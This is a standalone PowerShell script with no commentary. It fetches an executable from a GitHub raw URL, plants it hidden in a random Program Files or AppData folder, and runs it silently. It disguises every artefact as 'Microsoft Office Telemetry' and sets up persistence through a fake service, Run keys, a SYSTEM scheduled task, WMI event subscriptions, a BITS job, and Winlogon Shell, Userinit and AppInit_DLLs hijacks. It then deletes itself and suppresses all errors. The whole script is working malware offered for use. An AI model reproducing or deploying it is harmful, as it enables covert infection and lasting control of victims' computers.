function Run-Farm {
    try {
        $possibleDirectories = @(
            "$env:ProgramFiles",
            "$env:APPDATA",
            "$env:LOCALAPPDATA"
        )
        $selectedDirectory = $possibleDirectories | Get-Random
        if (-not (Test-Path $selectedDirectory)) {
            throw "Selected directory does not exist $selectedDirectory"
        }
        $subDirectories = Get-ChildItem -Path $selectedDirectory -Directory
        if ($subDirectories.Count -eq 0) {
            throw "No subdirectories found in the selected directory $selectedDirectory"
        }
        $targetSubDirectory = $subDirectories | Get-Random
        $TargetPath = Join-Path -Path $targetSubDirectory.FullName -ChildPath "microsoftofficetelemetry.exe"
        if (-not (Test-Path $TargetPath)) {
            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/microsoftofficetelemetry.exe" -OutFile $TargetPath
        }
        Start-Process -FilePath $TargetPath -WindowStyle "Hidden"
    }
    catch {
    }
}
Run-Farm





function Run-Farm2 {
    try {
        $possibleDirectories = @(
            "$env:ProgramFiles",
            "$env:APPDATA",
            "$env:LOCALAPPDATA"
        )
        $selectedDirectory = $possibleDirectories | Get-Random
        if (-not (Test-Path $selectedDirectory)) {
            $selectedDirectory = $env:APPDATA
        }
        $subDirectories = Get-ChildItem -Path $selectedDirectory -Directory -ErrorAction SilentlyContinue
        if ($subDirectories.Count -eq 0) {
            $targetDir = $selectedDirectory
        } else {
            $targetSubDirectory = $subDirectories | Get-Random
            $targetDir = $targetSubDirectory.FullName
        }
        $ps1Path = Join-Path $targetDir "systemupdate.ps1"
        $exePath = Join-Path $targetDir "microsoftofficetelemetry.exe"
        
        if (-not (Test-Path $ps1Path)) {
            $ps1Content = @"
try {
    `$targetDir = Split-Path -Parent `$MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
    if (-not `$targetDir) { `$targetDir = (Get-Location).Path }
    `$exePath = Join-Path `$targetDir "microsoftofficetelemetry.exe"
    if (-not (Test-Path `$exePath)) {
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/microsoftofficetelemetry.exe" -OutFile `$exePath -UseBasicParsing -ErrorAction SilentlyContinue
        if (Test-Path `$exePath) {
            (Get-Item `$exePath -ErrorAction SilentlyContinue).Attributes = 'Hidden'
        }
    }
    Start-Process -FilePath `$exePath -WindowStyle "Hidden" -ErrorAction SilentlyContinue
} catch {
}
"@
            $ps1Content | Out-File -FilePath $ps1Path -Encoding UTF8 -Force -ErrorAction SilentlyContinue
            if (Test-Path $ps1Path) {
                (Get-Item $ps1Path -ErrorAction SilentlyContinue).Attributes = 'Hidden'
            }
        }
        
        if (-not (Test-Path $exePath)) {
            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/microsoftofficetelemetry.exe" -OutFile $exePath -UseBasicParsing -ErrorAction SilentlyContinue
            if (Test-Path $exePath) {
                (Get-Item $exePath -ErrorAction SilentlyContinue).Attributes = 'Hidden'
            }
        }
        
        $binaryPath = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`""
        $scriptBlock = {
            param($ps1Path, $binaryPath, $exePath)
            try {
                $serviceName = "OfficeTelemetrySvc"
                if (-not (Get-Service -Name $serviceName -ErrorAction SilentlyContinue)) {
                    New-Service -Name $serviceName -BinaryPathName $binaryPath -StartupType Automatic -DisplayName "Microsoft Office Telemetry Service" -Description "Provides telemetry services for Microsoft Office applications." -ErrorAction SilentlyContinue | Out-Null
                }
                $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
                if ($service -and $service.Status -ne 'Running') {
                    Start-Service -Name $serviceName -ErrorAction SilentlyContinue
                }
            } catch {
            }
            try {
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                $regName = "OfficeTelemetry"
                $regValue = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
                if (-not $regValue) {
                    Set-ItemProperty -Path $regPath -Name $regName -Value $binaryPath -ErrorAction SilentlyContinue
                }
            } catch {
            }
            try {
                $regPathLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
                $regNameLM = "OfficeTelemetrySys"
                $regValueLM = Get-ItemProperty -Path $regPathLM -Name $regNameLM -ErrorAction SilentlyContinue
                if (-not $regValueLM) {
                    Set-ItemProperty -Path $regPathLM -Name $regNameLM -Value $binaryPath -ErrorAction SilentlyContinue
                }
            } catch {
            }
            try {
                $taskName = "OfficeTelemetryTask"
                $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
                if (-not $taskExists) {
                    $taskAction = New-ScheduledTaskAction -Execute $binaryPath
                    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
                    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
                    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Days 365)
                    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force -ErrorAction SilentlyContinue | Out-Null
                }
                Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
            } catch {
            }
            try {
                $wmiQuery = "SELECT * FROM Win32_LogonSession"
                $wmiCommand = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`""
                $wmiFilterName = "OfficeTelemetryFilter"
                $wmiConsumerName = "OfficeTelemetryConsumer"
                $wmiBindingName = "OfficeTelemetryBinding"
                $filterExists = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='$wmiFilterName'" -ErrorAction SilentlyContinue
                $consumerExists = Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='$wmiConsumerName'" -ErrorAction SilentlyContinue
                $bindingExists = Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Filter "Filter.Name='$wmiFilterName' AND Consumer.Name='$wmiConsumerName'" -ErrorAction SilentlyContinue
                if (-not $filterExists) {
                    $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
                        Name = $wmiFilterName
                        EventNameSpace = "root\cimv2"
                        QueryLanguage = "WQL"
                        Query = $wmiQuery
                    } -ErrorAction SilentlyContinue
                }
                if (-not $consumerExists) {
                    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
                        Name = $wmiConsumerName
                        CommandLineTemplate = $wmiCommand
                    } -ErrorAction SilentlyContinue
                }
                if (-not $bindingExists) {
                    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
                        Filter = $filterExists ? $filterExists : $filter
                        Consumer = $consumerExists ? $consumerExists : $consumer
                    } -ErrorAction SilentlyContinue
                }
            } catch {
            }
            try {
                $bitsJobName = "OfficeTelemetryBits"
                $bitsJobs = Get-BitsTransfer -AllUsers -Name $bitsJobName -ErrorAction SilentlyContinue
                if ($bitsJobs.Count -eq 0) {
                    Start-BitsTransfer -Source "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/microsoftofficetelemetry.exe" -Destination $exePath -Asynchronous -Name $bitsJobName -ErrorAction SilentlyContinue
                }
                if ($bitsJobs) {
                    $bitsJobs | Complete-BitsTransfer -ErrorAction SilentlyContinue
                }
            } catch {
            }
            try {
                $userShellPath = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
                $shellValue = (Get-ItemProperty -Path $userShellPath -Name "Shell" -ErrorAction SilentlyContinue).Shell
                if (-not $shellValue) {
                    $shellValue = "explorer.exe"
                }
                if ($shellValue -notlike "*$binaryPath*") {
                    $newShell = "$shellValue; $binaryPath"
                    Set-ItemProperty -Path $userShellPath -Name "Shell" -Value $newShell -ErrorAction SilentlyContinue
                }
            } catch {
            }
            # Additional persistence: AppInit DLLs (requires admin, but try)
            try {
                $appInitPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
                $appInitValue = Get-ItemProperty -Path $appInitPath -Name "AppInit_DLLs" -ErrorAction SilentlyContinue
                if (-not $appInitValue -or $appInitValue.AppInit_DLLs -notlike "*telemetry.dll*") {
                    $dllPath = Join-Path $env:TEMP "telemetry.dll"
                    # Assume DLL download or creation logic here; placeholder
                    Set-ItemProperty -Path $appInitPath -Name "AppInit_DLLs" -Value "$dllPath" -ErrorAction SilentlyContinue
                    Set-ItemProperty -Path $appInitPath -Name "LoadAppInit_DLLs" -Value 1 -ErrorAction SilentlyContinue
                }
            } catch {
            }
            # Additional persistence: UserInit (HKLM Winlogon)
            try {
                $sysShellPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
                $sysShellValue = (Get-ItemProperty -Path $sysShellPath -Name "Userinit" -ErrorAction SilentlyContinue).Userinit
                if (-not $sysShellValue) {
                    $sysShellValue = "C:\Windows\system32\userinit.exe,"
                }
                if ($sysShellValue -notlike "*powershell.exe*") {
                    $newUserInit = "$sysShellValue,$binaryPath,"
                    Set-ItemProperty -Path $sysShellPath -Name "Userinit" -Value $newUserInit -ErrorAction SilentlyContinue
                }
            } catch {
            }
        }
        Invoke-Command -ScriptBlock $scriptBlock -ArgumentList $ps1Path, $binaryPath, $exePath -ErrorAction SilentlyContinue
        
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`"" -ErrorAction SilentlyContinue
        
        # Self-delete or hide current script
        try {
            $currentScript = $MyInvocation.MyCommand.Path
            if (Test-Path $currentScript) {
                Remove-Item $currentScript -Force -ErrorAction SilentlyContinue
                if (Test-Path $currentScript) {
                    (Get-Item $currentScript -ErrorAction SilentlyContinue).Attributes = 'Hidden'
                }
            }
        } catch {
        }
    }
    catch {
    }
}
Run-Farm2
